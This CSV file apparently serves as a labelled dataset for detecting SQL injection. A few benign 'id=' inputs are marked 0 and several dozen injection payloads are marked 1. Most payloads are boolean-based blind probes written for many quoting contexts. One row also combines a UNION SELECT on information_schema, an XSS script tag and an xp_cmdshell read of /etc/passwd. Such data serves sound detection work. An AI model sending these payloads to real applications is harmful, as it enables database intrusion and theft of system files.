Sentence,Label
id=1,0
id=2,0
id=admin,0
id=test,0
id=123,0
"9259 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(""XSS"")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#",1
"1""'.,((.)))",1
"1'kXnwZt<'"">zeLkCe",1
1) AND 1901=4617 AND (1630=1630,1
1) AND 1972=1972 AND (3844=3844,1
1) AND 4071=9034 AND (8234=8234,1
1)) AND 5062=2146 AND ((1138=1138,1
1)) AND 1972=1972 AND ((2471=2471,1
1)) AND 7985=3189 AND ((4096=4096,1
1 AND 7006=5454,1
1 AND 1972=1972,1
1 AND 5069=4622,1
1 AND 8881=6900-- mUGO,1
1 AND 1972=1972-- BrPM,1
1 AND 3922=1956-- LKdT,1
1') AND 2127=3187 AND ('pUWp'='pUWp,1
1') AND 1972=1972 AND ('zUCZ'='zUCZ,1
1') AND 3113=7790 AND ('QwfQ'='QwfQ,1
1')) AND 3072=5943 AND (('fECU'='fECU,1
1')) AND 1972=1972 AND (('DQKL'='DQKL,1
1')) AND 4021=6740 AND (('BBdl'='BBdl,1
1' AND 6209=6749 AND 'pxfE'='pxfE,1
1' AND 1972=1972 AND 'iQcZ'='iQcZ,1
1' AND 9860=3510 AND 'RUhd'='RUhd,1
1') AND 6550=9077 AND ('hdwH' LIKE 'hdwH,1
1') AND 1972=1972 AND ('Sngh' LIKE 'Sngh,1
1') AND 5398=4450 AND ('baZv' LIKE 'baZv,1
1%' AND 5339=4727 AND 'PGjT%'='PGjT,1
1%' AND 1972=1972 AND 'uTTq%'='uTTq,1
1%' AND 6238=9915 AND 'dxIY%'='dxIY,1
1' AND 6555=1580 AND 'rWTF' LIKE 'rWTF,1
1' AND 1972=1972 AND 'mvHo' LIKE 'mvHo,1
1' AND 6394=9857 AND 'VZLb' LIKE 'VZLb,1
"1"") AND 8504=9888 AND (""xFtd""=""xFtd",1
"1"") AND 1972=1972 AND (""smZj""=""smZj",1
"1"") AND 6331=8473 AND (""HkNA""=""HkNA",1
"1"" AND 3029=9935 AND ""TzkH""=""TzkH",1
"1"" AND 1972=1972 AND ""LcnN""=""LcnN",1
"1"" AND 7056=3151 AND ""VuKJ""=""VuKJ",1
1) AND 5948=(SELECT (CASE WHEN (5948=6199) THEN 5948 ELSE (SELECT 6199 UNION SELECT 8242) END))-- NsPC,1
1) AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- ayvP,1
1) AND 3357=(SELECT (CASE WHEN (3357=4511) THEN 3357 ELSE (SELECT 4511 UNION SELECT 2572) END))-- IZsx,1
1)) AND 2637=(SELECT (CASE WHEN (2637=6570) THEN 2637 ELSE (SELECT 6570 UNION SELECT 7778) END))-- ebuc,1
1)) AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- KPyQ,1
1)) AND 7432=(SELECT (CASE WHEN (7432=2791) THEN 7432 ELSE (SELECT 2791 UNION SELECT 5412) END))-- dqex,1
1 AND 3742=(SELECT (CASE WHEN (3742=3274) THEN 3742 ELSE (SELECT 3274 UNION SELECT 2214) END))-- qLBG,1
1 AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- xReu,1
1 AND 3527=(SELECT (CASE WHEN (3527=9209) THEN 3527 ELSE (SELECT 9209 UNION SELECT 3761) END))-- bXmT,1
1') AND 8707=(SELECT (CASE WHEN (8707=4605) THEN 8707 ELSE (SELECT 4605 UNION SELECT 7096) END))-- WkcW,1
1') AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- iDjo,1
1') AND 2989=(SELECT (CASE WHEN (2989=8988) THEN 2989 ELSE (SELECT 8988 UNION SELECT 2523) END))-- sUNJ,1
1')) AND 2436=(SELECT (CASE WHEN (2436=7289) THEN 2436 ELSE (SELECT 7289 UNION SELECT 1247) END))-- KZne,1
1')) AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- yarS,1
1')) AND 6898=(SELECT (CASE WHEN (6898=6102) THEN 6898 ELSE (SELECT 6102 UNION SELECT 8090) END))-- OweU,1
1' AND 7162=(SELECT (CASE WHEN (7162=3070) THEN 7162 ELSE (SELECT 3070 UNION SELECT 2733) END))-- Znda,1
1' AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- LiUh,1
1' AND 9119=(SELECT (CASE WHEN (9119=3370) THEN 9119 ELSE (SELECT 3370 UNION SELECT 8709) END))-- jLUb,1
1%' AND 8913=(SELECT (CASE WHEN (8913=5310) THEN 8913 ELSE (SELECT 5310 UNION SELECT 7449) END))-- zWYE,1
1%' AND 7801=(SELECT (CASE WHEN (7801=7801) THEN 7801 ELSE (SELECT 6294 UNION SELECT 6829) END))-- HsfO,1
1%' AND 5052=(SELECT (CASE WHEN (5052=5964) THEN 5052 ELSE (SELECT 5964 UNION SELECT 2181) END))-- ONVF,1
"1"") AND 7355=(SELECT (CASE WHEN (7355=2530) THEN 7355 ELSE (SELECT 2530 UNION SELECT 9876) END))-- BSDB",1
